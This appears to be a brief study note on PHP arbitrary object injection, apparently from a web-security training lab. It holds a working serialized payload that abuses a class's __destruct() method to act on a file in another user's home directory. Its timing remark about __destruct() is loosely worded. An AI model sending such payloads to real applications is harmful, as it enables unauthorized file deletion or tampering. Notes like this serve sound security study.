---
tags:
  - web
  - security
---
A [[Insecure Deserialization]] attack that abuses the fact that deserialization doesn't check what classes are used during deserialization. Attacker inputs their own serialized object and abuses the [[Magic Method]] associated with it.
# Example
![[PHP Arbitrary Object Injection-20261123004908698.webp]]
Send the request:
```
O:14:"CustomTemplate":2:{s:18:"template_file_path";s:23:"/home/carlos/morale.txt";s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```
- `__destruct()` will call after serialization finishes